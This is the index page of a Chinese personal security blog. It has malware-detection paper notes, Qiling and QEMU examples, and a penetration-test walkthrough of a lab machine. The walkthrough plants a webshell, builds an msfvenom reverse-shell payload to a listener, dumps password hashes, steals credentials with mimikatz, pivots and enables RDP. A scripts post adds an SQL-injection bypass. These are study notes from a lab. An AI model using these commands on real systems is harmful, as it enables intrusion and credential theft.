@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+
+  
+  
+  
+  
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="Hexo" rel="home">Hexo</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main">
+  
+    <article id="post-index" class="post-index post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/10/05/index/">index</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/10/05/index/" data-id="ckfwjjiqs0000cswbhb3v8hfn" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h1 align="center">童帅的博客罢了</h1>
+
+
+
+
+
+<h6 align="right">童帅 2020-10-5</h6>
+
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/10/05/index/">
+    <time datetime="2020-10-05T12:25:19.000Z" class="entry-date">
+        2020-10-05
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-note/papers/1-1" class="post-note/papers/1-1 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/27/note/papers/1-1/">app行为的语义提取方案读论文笔记</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/27/note/papers/1-1/" data-id="cki3dgtlv0000bwwbawla2v06" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>语义提取首先要定义语义，比如说一个软件的行为有无恶意，有恶意和无恶意就是语义。然后才可以在软件中提取信息，整合信息，判断是否具有这些语义。或者可以判断两个软件是否具有相同语义。</p>
+<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a target="_blank" rel="noopener" href="http://www.jos.org.cn/jos/ch/reader/create_pdf.aspx?file_no=3953&amp;journal_id=jos">基于语义的恶意代码行为特征提取及检测方法</a></p>
+<p>恶意代码总是会有各种混淆以干扰分析，并且还会有变种。比如说插入垃圾行为，插入垃圾代码。这时如果从一个更高的抽象层次去分析，就可以抵抗这些干扰。于是就引入了语义特征分析。</p>
+<blockquote>
+<p>现有的分析方法难于抵抗代码混淆，特征库庞大，在于分析方案无法分析出恶意代码的根本意图</p>
+</blockquote>
+<p>这篇论文的参考资料8-10是行为语义相关的。</p>
+<p>主要通过数据依赖和控制依赖，行为图构建，语义特征分析来分析恶意代码的行为，主要阐述了语义无关和语义等价两类混淆技术。</p>
+<p>先进行动态污点传播分析</p>
+<p>然后是行为依赖图的构建：</p>
+<ol>
+<li>行为依赖图初始化为空</li>
+<li>遇到产生污点的关键系统调用，添加节点</li>
+<li>遇到新的系统调用时，如果传入参数包含污点数据，则将其添加为节点<ul>
+<li>这里注意通过DFA将系统调用序列等价为某一个系统调用</li>
+</ul>
+</li>
+<li>依赖图的添加是通过添加新节点时回溯计算污点传播过程完成的<br>对于控制流转移的问题，采用递归下降反汇编算法</li>
+<li>当污点漂白或恶意代码执行结束，行为图构建结束</li>
+</ol>
+<p>语义等价通过等价库解决，语义无关有相应的提取方案。</p>
+<p>对于语义无关调用，通过污点分析分析相关调用对系统的状态是否产生影响，系统状态定义为操作系统的完整性和数据安全性。语义无关系统调用在行为图中定义为没有使系统状态产生改变的节点；将循环替换为一次执行信息</p>
+<p>最后构建一个恶意代码行为图特征库，匹配系统调用，边，节点，并且为不同的匹配元素设置不同的权值，最后一个加权平均获得最后的[0,1]的值，并且涉资一个阈值，超过阈值就认为是恶意代码。</p>
+<p>阈值设置是基于实验结果的。</p>
+<blockquote>
+<p>通过对行为层混淆技术的分析,我们从语义角度将其分为语义无关调用插入和语义等价调用变换两类.语义无关调用插入是指恶意代码中常加入一些与其意图无关没有无实际作用的系统调用,目的是改变代码特征,我们从语义角度将其称为语义无关调用.语义等价调用变换主要是指通过等价系统调用替换、循环变换等方式改变执行行为的系统调用序列,从而改变特征.等价系统调用序列是指行为相同的不同系统调用序列,将其互相替换,便可在不改变行为的前提下改变特征.循环变换即指改变操作粒度,将同样的行为分割为不同循环而产生不同图特征的混淆方式.这两种混淆方法的共同特点是,在保持恶意代码行为意图即代码语义的条件下,通过等价替换改变特征,我们将此类变换统称为语义等价调用变换</p>
+</blockquote>
+<p>7-10参考资料可能有语义分析</p>
+<blockquote>
+<p>[7] Sathyanarayan VS, Kohli P, Bruhadeshwar B. Signature generation and detection of malware families. In: Proc. of the 13th<br>Austalasian Conf. on Information Security and Privacy. Wollongong, 2008. 336−349. [doi: 10.1007/978-3-540-70500-0_25]<br>[8] Christodorescu M, Jha S, Seshia SA, Song DX, Bryant RE. Semantics-Aware malware detection. In: Proc. of the 2005 IEEE Symp.on Security and Privacy. 2005. 32−46. [doi: 10.1109/SP.2005.20]<br>[9] Preda MD, Christodorescu M, Jha S, Debray S. A semantics-based approach to malware detection. In: Proc. of the Symp. onPrinciples of Programming Languages. New York: ACM Press, 2007. 377−388. [doi: 10.1145/1190216.1190270]<br>[10] Kinder J, Katzenbeisser S, Schallhart C, Veith H. Detecting malicious code by model checking. In: Proc. of the 2nd Int’l Conf. onIntrusion and Malware Detection and Vulnerability Assessment (DIMVA 2005). LNCS 3548, Vienna: Springer-Verlag, 2005.174−187. [doi: 10.1007/11506881_11] </p>
+</blockquote>
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><a target="_blank" rel="noopener" href="https://xueshu.baidu.com/usercenter/paper/show?paperid=dd2172d9cc4bf41dbc92641acce1ea1a&amp;site=xueshu_se">https://xueshu.baidu.com/usercenter/paper/show?paperid=dd2172d9cc4bf41dbc92641acce1ea1a&amp;site=xueshu_se</a></p>
+<p>Android系统下混淆恶意软件的检测研究</p>
+<p>基于source-sink的语义特征的提取与加工处理：从程序中提取从source到sink的数据流，使用自定义的处理器进行处理，产生最终的特征</p>
+<p>source即敏感信息，sink即将敏感信息泄露的API调用。然后进行格式化，找到恶意软件家族最常用的特征。</p>
+<p>API调用的语义特征，权限，linux命令</p>
+<p>flowdroid提取source-sink流,apktool提取权限特征</p>
+<p><img src="/.com//2-1.PNG" alt></p>
+<p>后面是用机器学习的方式进行分类的</p>
+<p><img src="/.com//2-2.PNG" alt></p>
+<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>因为看到前面的方案都有污点分析的方法，所以找了找污点分析的文献综述</p>
+<p>污点分析技术的原理和实践应用<br><a target="_blank" rel="noopener" href="https://xueshu.baidu.com/usercenter/paper/show?paperid=be0648c3bf970bf4977b893e2089f8d7&amp;site=xueshu_se">https://xueshu.baidu.com/usercenter/paper/show?paperid=be0648c3bf970bf4977b893e2089f8d7&amp;site=xueshu_se</a></p>
+<p>之前看过的，介绍了污点分析的现状，相关工具，分类，静态污点分析和动态污点分析的优缺点</p>
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>A Semantics-Based Approach to Malware Detection </p>
+<blockquote>
+<p>这篇文章认为识别恶意软件的关键在于语义</p>
+</blockquote>
+<p>后面没看懂了</p>
+<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>Sentics-Aware Malware Detection</p>
+<p>定义一系列的模板，如果目标代码和已定义的模板，存在一个内存上下文，在这个内存上下文相同的情况下，对内存的影响相同，则目标代码和模板由相同的语义。模板是由自定义的语言写成的，这样就忽略了平台差异</p>
+<p>模板中的代码，在一定的状态下，产生一系列的系统调用称为事件</p>
+<p>定义J为一个恶意软件家族所具有的所有行为的模板集合，如果一个程序包含这个集合中的所有行为，则这个程序有恶意行为</p>
+<p>模板匹配程序</p>
+<p>模板T的一个节点m和程序P的一个节点n</p>
+<ul>
+<li>节点匹配：如果有函数f,f(m)=n，则说这两个节点匹配,比如说图中的4和7节点<br> <img src="/.com//5-1.PNG" alt></li>
+<li>边匹配：点匹配完成之后，需要确定节点中的变量在节点指令执行完成之后值是否相同</li>
+</ul>
+<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>Semantics-Aware Android Malware Classification Using Weighted Contextual API Dependency Graphs</p>
+<p>使用Weighted Contextual API Dependency Graphs(WC-ADG)描述APP的行为</p>
+<p>带有权值和上下文的API依赖图</p>
+<blockquote>
+<p>API依赖：展示应用如何与Android框架交互</p>
+<p>上下文：在调用API时上下文</p>
+<p>常量：攻击者一般把窃取到的数据发送到指定的位置，所以和调用API有关的常量值得注意<br>API依赖图不精确匹配，因为不同的API(甚至带常量的和不带常量的)对系统安全性的影响不同，所以对于不同的API应该赋予不同的权值</p>
+</blockquote>
+<p>形式化定义：WC-ADG G=(V,E,$\alpha$,$\beta$),API操作$\Sigma$,权值空间$W$<br>符号|含义<br>—|—<br>$V$|API操作，也就是点<br>$E$|API之间的关联，也就是边<br>$\Sigma$|带有上下文的API操作<br>$\alpha$|把点对应到$\Sigma$中的一个元素<br>$\beta$|为每一个点赋权值<br>例子</p>
+<p><img src="/.com//6-1.PNG" alt></p>
+<p>生成图的步骤</p>
+<ol>
+<li>发现入口，入口分为被用户察觉和不被用户察觉。并且入口发现之后就可以找到参数，关联等</li>
+<li>分析数据流，交叉引用分析</li>
+</ol>
+<p>探测步骤</p>
+<ol>
+<li>生成图，然后根据已有的软件的图(没有恶意行为的)判断相似度，如果相似率小于0.3，则判断为不正常</li>
+<li>异常行为探测</li>
+<li>训练分类器<ol>
+<li>建立已有软件图的数据库，包括恶意/非恶意软件的一些小行为，移除了恶意软件和非恶意软件共有的行为</li>
+<li>给定一个待测软件，生成它的功能向量，向量的每一个元素代表数据库中的一个图，元素值代表和该图的相似度</li>
+</ol>
+</li>
+</ol>
+<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>Detecting Malicious Code by Model Checking</p>
+<p>把控制流模型化为一个带标签的有限图</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/27/note/papers/1-1/">
+    <time datetime="2020-11-27T15:40:06.000Z" class="entry-date">
+        2020-11-27
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-note/rev/qiling" class="post-note/rev/qiling post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/26/note/rev/qiling/">麒麟框架使用--官方示例</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/26/note/rev/qiling/" data-id="cki0ciblk0000pkwb25xoetyx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install qiling</span><br></pre></td></tr></table></figure>
+<p>另外如果需要在windows上面执行Linux程序的话，需要copy windows的dll到linux，并且需要写一个登记</p>
+<p>官方文档说明：<br><a target="_blank" rel="noopener" href="https://docs.qiling.io/en/latest/install/">https://docs.qiling.io/en/latest/install/</a></p>
+<p>对于常用dll，直接执行examples/scripts/dllcollector.bat就可以copy了</p>
+<ol>
+<li>在linux上面模拟windows执行环境</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sandbox to emulate the EXE</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sandbox</span>(<span class="params">path, rootfs</span>):</span></span><br><span class="line">    <span class="comment"># setup Qiling engine</span></span><br><span class="line">    ql = Qiling(path, rootfs)</span><br><span class="line">    <span class="comment"># now emulate the EXE</span></span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># execute Windows EXE under our rootfs</span></span><br><span class="line">    my_sandbox([<span class="string">&quot;examples\\rootfs\\x86_windows\\bin\\x86_hello.exe&quot;</span>], <span class="string">&quot;examples/rootfs/x86_windows&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol>
+<li>patch程序</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_call_dialog_func</span>(<span class="params">ql</span>):</span></span><br><span class="line">    <span class="comment"># get DialogFunc address</span></span><br><span class="line">    lpDialogFunc = ql.unpack32(ql.mem.read(ql.reg.esp - <span class="number">0x8</span>, <span class="number">4</span>))</span><br><span class="line">    <span class="comment"># setup stack memory for DialogFunc</span></span><br><span class="line">    ql.stack_push(<span class="number">0</span>)</span><br><span class="line">    ql.stack_push(<span class="number">1001</span>)</span><br><span class="line">    ql.stack_push(<span class="number">273</span>)</span><br><span class="line">    ql.stack_push(<span class="number">0</span>)</span><br><span class="line">    ql.stack_push(<span class="number">0x0401018</span>)</span><br><span class="line">    <span class="comment"># force EIP to DialogFunc</span></span><br><span class="line">    ql.reg.eip = lpDialogFunc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sandbox</span>(<span class="params">path, rootfs</span>):</span></span><br><span class="line">    ql = Qiling(path, rootfs)</span><br><span class="line">    <span class="comment"># NOP out some code</span></span><br><span class="line">    ql.patch(<span class="number">0x004010B5</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x004010CD</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x0040110B</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x00401112</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="comment"># hook at an address with a callback</span></span><br><span class="line">    ql.hook_address(force_call_dialog_func, <span class="number">0x00401016</span>)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sandbox([<span class="string">&quot;rootfs/x86_windows/bin/Easy_CrackMe.exe&quot;</span>], <span class="string">&quot;rootfs/x86_windows&quot;</span>)</span><br></pre></td></tr></table></figure>
+<ol>
+<li>模拟gdbserver</li>
+</ol>
+<p>演示程序地址<br><a target="_blank" rel="noopener" href="https://github.com/mzfr/ctf-writeups/tree/master/xiomara-2019/Reversing/Elf_basic">https://github.com/mzfr/ctf-writeups/tree/master/xiomara-2019/Reversing/Elf_basic</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">&#x27;examples/rootfs/x8664_linux/bin/AnokhREV&#x27;</span>],<span class="string">&#x27;examples/rootfs/x8664_linux&#x27;</span>,output=<span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">    ql.gdb = <span class="string">&#x27;0.0.0.0:9999&#x27;</span></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure>
+<p>这个例子不知道为何跑起来之后gdb并没有阻塞</p>
+<ol>
+<li>qltool例子</li>
+</ol>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/26/note/rev/qiling/">
+    <time datetime="2020-11-26T10:20:35.000Z" class="entry-date">
+        2020-11-26
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-note/web/pentist-1" class="post-note/web/pentist-1 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/24/note/web/pentist-1/">靶机看答案渗透记录-1</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/24/note/web/pentist-1/" data-id="ckhx5vzvk0000lowbcptm8drg" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>nmap扫不到，但是可以ping通= =</p>
+<p>打开主页之后是phpstudy探针，按照官方文档关闭</p>
+<p>然后访问，是个目录遍历漏洞= =</p>
+<p>经过配置进入了主页</p>
+<h2 id="找到后台"><a href="#找到后台" class="headerlink" title="找到后台"></a>找到后台</h2><p>发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口</p>
+<p>尝试弱密码admin/123456可以登陆</p>
+<h2 id="后台操作"><a href="#后台操作" class="headerlink" title="后台操作"></a>后台操作</h2><ol>
+<li>有个sql执行可以执行某些操作</li>
+<li>修改首页模板，index.php可以添加一句话木马， 使用weevely访问失败，但是可以使用 <a target="_blank" rel="noopener" href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">AntSword</a> 访问</li>
+<li><p>有个gethash的工具可以获取windows上面密码的hash值，但是没下到<br>网上找到一个渗透工具集，好家伙<del>白嫖真爽</del></p>
+<p>pwdump也可以获取hash，获取到了hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">liukaifeng01:1000:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure></li>
+<li>虽然找到了hash值，但是没有找到密码</li>
+<li>开启了3306端口，可以尝试连接，但是连接失败，不允许连接</li>
+<li>使用msf生成木马<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.117 lport=4444 -f exe -o /root/桌面/hakcer.exe</span><br></pre></td></tr></table></figure>
+kali下可以使用msfpc简化<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfpc windows reverse eth1 4444</span><br></pre></td></tr></table></figure></li>
+<li>msf使用exploit/multi/handler模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 4444</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+上传生成的木马到靶机，执行，连接成功，执行sysinfo命令测试是否成功</li>
+<li>run vnc进行桌面监控</li>
+<li>run autoroute -s 192.168.52.1/24<br> 这条命令允许攻击机进入192.168.52.1/24子网</li>
+<li>arp -a查看域控成员</li>
+<li>使用background把当前session保存至后台</li>
+<li>扫描远端IP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li>
+<li>开放了445端口，ms17_010漏洞，大佬说蓝屏，还没试</li>
+<li>ms08_067攻击失败</li>
+<li>再次连接win7，使用load mimikatz获得凭证</li>
+<li>getsystem命令 sysinfo命令 ps命令</li>
+<li>migrate命令，explorer为2872</li>
+<li>之前load了mimikatz(kiwi)插件，然后执行creds_tspkg获取域控密码，新版本msf变了，遇事不决help</li>
+<li>使用run post/windows/manage/enable_rdp开启windows的rdp远程桌面</li>
+<li>linux使用rdesktop连接，windows直接使用远程桌面连接<br>用户名和密码为Administrator/hongrisec@2019</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>知道系统相关信息之后可以下载相关源码进行审计发现漏洞。从而找到管理登陆页面，弱密码等</li>
+<li>pwdump可以获取windows的密码哈希值</li>
+<li>msfvenom可以生成木马，msfpc简化生成操作，木马连接到exploit/multi/handler</li>
+<li>run vnc用于监控桌面，远程桌面等</li>
+<li>run autoroute -s 192.168.52.1/24，这条命令允许攻击机进入192.168.52.1/24子网</li>
+<li>msf background把当前session保存至后台，sessions -l 列出所有session，sessions num切换至第num个session</li>
+<li>使用auxiliary/scanner/portscan/tcp扫描对应网段的主机</li>
+<li>mimikatz插件用于获取登陆凭证，插件已经被替换为kiwi，使用help获取相关用法</li>
+<li>使用run post/windows/manage/enable_rdp开启远程桌面</li>
+<li>Linux使用rdesktop,windows使用远程桌面连接远程桌面</li>
+<li>migrate命令进程迁移，让进程成为目标机器某个合法进程的子进程，比如说explorer.exe</li>
+</ol>
+<h2 id="两个漏洞"><a href="#两个漏洞" class="headerlink" title="两个漏洞"></a>两个漏洞</h2><ol>
+<li>msf17_010</li>
+<li>msf08_067<br>都使用了445端口<br>MS08-067漏洞原理分析及还原 - 乃逸夫的文章 - 知乎<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27155431">https://zhuanlan.zhihu.com/p/27155431</a></li>
+</ol>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/24/note/web/pentist-1/">
+    <time datetime="2020-11-24T08:42:52.000Z" class="entry-date">
+        2020-11-24
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-writeup/kctf2020-10/wp" class="post-writeup/kctf2020-10/wp post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/20/writeup/kctf2020-10/wp/">kctf2020部分wp</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/20/writeup/kctf2020-10/wp/" data-id="ckhvqbek30001qr5d2o8h8j58" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="开场题"><a href="#开场题" class="headerlink" title="开场题"></a>开场题</h2><p>直接解，略</p>
+<p>符号执行也行</p>
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><ol>
+<li></li>
+</ol>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/20/writeup/kctf2020-10/wp/">
+    <time datetime="2020-11-20T09:30:53.000Z" class="entry-date">
+        2020-11-20
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-note/web/DiD" class="post-note/web/DiD post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/20/note/web/DiD/">网络安全中的纵深防御概念</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/20/note/web/DiD/" data-id="ckhvqbek00000qr5d7twk3ji3" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/20/note/web/DiD/">
+    <time datetime="2020-11-20T09:06:46.000Z" class="entry-date">
+        2020-11-20
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-note/rev/qemu-1" class="post-note/rev/qemu-1 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/19/note/rev/qemu-1/">arch上使用qemu调试程序</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/19/note/rev/qemu-1/" data-id="ckhot4fw300005x5d05ln0e71" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <ol>
+<li>安装gdb,qemu</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S gdb-multiarch gdb pwndbg qemu qemu-arch-extra</span><br></pre></td></tr></table></figure>
+<ol>
+<li>启动程序(以mips为例)</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mips -g 2222 ./mx</span><br></pre></td></tr></table></figure>
+<ol>
+<li>启动gdb-multiarch</li>
+<li>set architecture mips</li>
+<li>target remote localhost:2222</li>
+</ol>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/19/note/rev/qemu-1/">
+    <time datetime="2020-11-19T12:21:46.000Z" class="entry-date">
+        2020-11-19
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-note/web/scripts" class="post-note/web/scripts post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2020/11/13/note/web/scripts/">每日读大佬jio本</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/13/note/web/scripts/" data-id="ckhmvl79u0000jswb6qsgdbie" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <blockquote>
+<p>itertools.permutations 返回对象的全排列，第二个参数指出数量<br>dedecms如果不允许上传文件会返回Upload filetype not allow !<br>post请求方式中带有_FILES[mochazz][tmp_name] 表示上传<br>adminer配置文件在common.inc.php<br>sql注入注释绕过//%0A select &lt;?php //%0Aphpinfo()?&gt;<br>哥斯拉的马</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2></blockquote>
